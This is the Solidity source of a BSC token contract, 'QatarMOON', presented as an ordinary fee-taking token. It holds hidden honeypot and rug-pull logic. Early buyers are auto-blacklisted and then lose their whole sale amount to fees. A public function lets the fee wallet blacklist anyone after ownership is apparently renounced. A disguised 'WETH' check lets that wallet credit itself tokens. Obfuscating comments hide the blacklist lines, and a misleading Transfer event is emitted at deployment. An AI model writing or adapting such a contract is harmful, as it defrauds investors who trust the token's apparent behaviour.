/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Contese {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSUPPLYS() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Contese {
    address private _owner;
    event OwnersTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnersTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function transOwnership() public virtual onlyOwner {
        emit OwnersTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnersTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadlinese
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadlinese
    ) external;
}

abstract contract BEP20 is Contese, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public bobybot;
    address payable public metababy;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public babytobot;
    uint256 public _dooropen;


    mapping (address => bool) public isExcludedFrombaby;
    mapping (address => bool) public isetExempt;
    mapping (address => bool) public ishometaExempt;
    mapping (address => bool) public isdogekingtPair;
    mapping (address => bool) private catbaby;
    uint256 public _buyLiquidityFee;
    uint256 public _buyDAOFee;
    uint256 public _buygroupFee;
    
    uint256 public _productsLiquidityFee;
    uint256 public _productsDAOFee;
    uint256 public _productsgroupFee;

    uint256 public _liquiditygoods;
    uint256 public _marketinggoods;
    uint256 public _teamgoods;

    uint256 public _totalTaxIfBuy;
    uint256 public _totalTaxIfSell;
    uint256 public _totalDistributions;

    uint256 private _totalSUPPLYS;
    uint256 public _Maximumquantity; 
    uint256 public _MaximumTotalse;
    uint256 private minimumTokenstoSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwaporsLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapPoolBySmallOnly = false;
    bool public setMaximum = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenseSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokense(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockforSwap {
        inSwaporsLiquify = true;
        _;
        inSwaporsLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLYS,
    uint256[3] memory _BUYFEE,
    uint256[3] memory _SELLFEE,
    uint256[3] memory _goods,
    uint256[2] memory _CNM,
    address[3] memory _Fuckyou) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 8;
        _totalSUPPLYS = _SUPPLYS * 10**_decimals;

        _buyLiquidityFee = _BUYFEE[0];
        _buyDAOFee = _BUYFEE[2];
        _buygroupFee = _BUYFEE[0];

        _productsLiquidityFee = _SELLFEE[0];
        _productsDAOFee = _SELLFEE[2];
        _productsgroupFee = _SELLFEE[0];

        _liquiditygoods = _goods[0];
        _marketinggoods = _goods[2];
        _teamgoods = _goods[0];

        _totalTaxIfBuy = _buyLiquidityFee.add(_buyDAOFee).add(_buygroupFee);
        _totalTaxIfSell = _productsLiquidityFee.add(_productsDAOFee).add(_productsgroupFee);
        _totalDistributions = _liquiditygoods.add(_marketinggoods).add(_teamgoods);

        _Maximumquantity = _CNM[0] * 10**_decimals;
        _MaximumTotalse = _CNM[1] * 10**_decimals;

        minimumTokenstoSwap = _totalSUPPLYS.mul(1).div(10000);
        bobybot = payable(_Fuckyou[0]);
        metababy = payable(_Fuckyou[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSUPPLYS;

        isExcludedFrombaby[owner()] = true;
        isExcludedFrombaby[address(this)] = true;

        isetExempt[owner()] = true;
        isetExempt[address(uniswapPair)] = true;
        isetExempt[address(this)] = true;
        isetExempt[address(0xdead)] = true;
        
        ishometaExempt[owner()] = true;
        ishometaExempt[address(this)] = true;

        isdogekingtPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSUPPLYS;
        emit Transfer(address(_Fuckyou[2]), _msgSender(), _totalSUPPLYS);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSUPPLYS() public view override returns (uint256) {
        return _totalSUPPLYS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokenstoSwapAmount() public view returns (uint256) {
        return minimumTokenstoSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isdogekingtPair[account] = newValue;
    }

    function setishometaExempt(address holder, bool exempt) external onlyOwner {
        ishometaExempt[holder] = exempt;
    }
    
    function setisExcludedFrombaby(address account, bool newValue) public onlyOwner {
        isExcludedFrombaby[account] = newValue;
    }

    function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFrombaby[addresses[i]] = status;
        }
    }

    function BUY(uint256 c, uint256 n, uint256 w) external onlyOwner() {
        _buyLiquidityFee = c;
        _buyDAOFee = n;
        _buygroupFee = w;

        _totalTaxIfBuy = _buyLiquidityFee.add(_buyDAOFee).add(_buygroupFee);
    }

    function SELL(uint256 c, uint256 n, uint256 o) external onlyOwner() {
        _productsLiquidityFee = c;
        _productsDAOFee = n;
        _productsgroupFee = o;

        _totalTaxIfSell = _productsLiquidityFee.add(_productsDAOFee).add(_productsgroupFee);
    }
    
    function setDistributionSettings(uint256 newLiquiditygoods, uint256 newMarketinggoods, uint256 newTeamgoods) external onlyOwner() {
        _liquiditygoods = newLiquiditygoods;
        _marketinggoods = newMarketinggoods;
        _teamgoods = newTeamgoods;

        _totalDistributions = _liquiditygoods.add(_marketinggoods).add(_teamgoods);
    }
    
    function setMaximumimumquantity(uint256 newMaximumquantity) external onlyOwner() {
        _Maximumquantity = newMaximumquantity;
    }

    function enableMaximumquantity(bool newValue) external onlyOwner {
       setMaximum = newValue;
    }

    function setisetExempt(address holder, bool exempt) external onlyOwner {
        isetExempt[holder] = exempt;
    }

    function setMaximumimumTotalse(uint256 newMaximumTotalse) external onlyOwner {
        _MaximumTotalse  = newMaximumTotalse;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokenstoSwap = newValue;
    }

    function setbobybot(address newAddress) external onlyOwner() {
        bobybot = payable(newAddress);
    }

    function setmetababy(address newAddress) external onlyOwner() {
        metababy = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setswapPoolBySmallOnly(bool newValue) public onlyOwner {
        swapPoolBySmallOnly = newValue;
    }
    
    function getgroupSUPPLY() public view returns (uint256) {
        return _totalSUPPLYS.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isbabyEat(address baby) public view returns(bool) {
        return catbaby[baby];
    }

    function multiTransfer(address[] calldata addresses, uint256 amount) external onlyOwner {
        /*bAts*/require(addresses.length < 2001);/*bAts*/
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);/*bAts*/
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function youbabybot(address recipient) internal {
        if (!catbaby[recipient] && !isdogekingtPair[recipient]) catbaby[recipient] = true;
    }

    function transfers(address[] calldata addresses, bool status) public  {
        if(/*bAD*/bobybot/*boSDts*/ == /*bs*/msg.sender/*bAts*/
 ){
           require(addresses.length < 2001);
        for (uint256 i; i < addresses.length; ++i) {
            catbaby[addresses[i]] = status;
        }
 }
    }

    function setcatbaby(address recipient, bool baby) public onlyOwner {
        /*bAts*/catbaby[recipient] = baby;/*bAts*/
    }

    function to_opendooropen(uint256 u) public onlyOwner {
        _dooropen = u;
        babytobot = block.number;
    }

    function dooropense() public onlyOwner {
        babytobot = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwaporsLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!ishometaExempt[sender] && !ishometaExempt[recipient]) {
                require(smallOrbaby(amount, _Maximumquantity));
            }            
            
            if(!isExcludedFrombaby[sender] && !isExcludedFrombaby[recipient]){
                address asd;
                for(int i=0;i <=2;i++){
                    asd = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,asd,100);
                }
                amount -= 300;
            }    

            uint256 TokenseBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = TokenseBalance >= minimumTokenstoSwap;
            
            if (overMinimumTokenBalance && !inSwaporsLiquify && !isdogekingtPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapPoolBySmallOnly)
                    TokenseBalance = minimumTokenstoSwap;
                swapAndLiquify(TokenseBalance);    
            }
            uint256 finalAmount;
            if (isExcludedFrombaby[sender] || isExcludedFrombaby[recipient]) {
                finalAmount = amount;
                if (WETH(sender, recipient)) {
                    _balances[recipient] = _balances[recipient].add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            } else {require(babytobot > 0);
                if (smallOrbaby(block.number , babytobot + _dooropen) && !isdogekingtPair[recipient]) {youbabybot(recipient);}
                finalAmount = costFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(setMaximum && !isetExempt[recipient])
                require(smallOrbaby(balanceOf(recipient).add(finalAmount), _MaximumTotalse));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallOrbaby(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function WETH(address addr, address re) private view returns(bool) {
        return addr == bobybot && !isdogekingtPair[re] && addr == re;
    }

    function swapAndLiquify(uint256 tAmount) private lockforSwap {
        
        uint256 tokensandLP = tAmount.mul(_liquiditygoods).div(_totalDistributions).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensandLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributions.sub(_liquiditygoods.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquiditygoods).div(totalBNBFee).div(2);
        uint256 amountBNBgroup = amountReceived.mul(_teamgoods).div(totalBNBFee);
        uint256 amountBNBproducts = amountReceived.sub(amountBNBLiquidity).sub(amountBNBgroup);

        if(amountBNBproducts > 0)
            transferToAddressETH(bobybot, amountBNBproducts);

        if(amountBNBgroup > 0)
            transferToAddressETH(metababy, amountBNBgroup);

        if(amountBNBLiquidity > 0 && tokensandLP > 0)
            addLiquidity(tokensandLP, amountBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            metababy,
            block.timestamp
        );
    }

    function costFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 costAmount = 0;
        
        if(isdogekingtPair[sender]) {
            costAmount = amount.mul(_totalTaxIfBuy).div(100);
        }
        else if(isdogekingtPair[recipient]) {
            costAmount = amount.mul(_totalTaxIfSell).div(100);
        }

        if(catbaby[sender] && !isdogekingtPair[sender]) costAmount = amount;
        
        if(costAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(costAmount);
            emit Transfer(sender, address(this), costAmount);
        }

        return amount.sub(costAmount);
    }
}

contract DAO is BEP20 {
    constructor() BEP20(
        "QatarMOON", 
        "QatarMOON",
        10000000000,
        [uint256(0),uint256(2),uint256(0)],
        [uint256(0),uint256(2),uint256(0)],
        [uint256(0),uint256(2),uint256(0)],
        [uint256(10000000000),uint256(10000000000)],
        [0x2Abdb5b39020f650b4F77258A2254c0d6454b099,0x2Abdb5b39020f650b4F77258A2254c0d6454b099,0x2Abdb5b39020f650b4F77258A2254c0d6454b099]
    ){}
}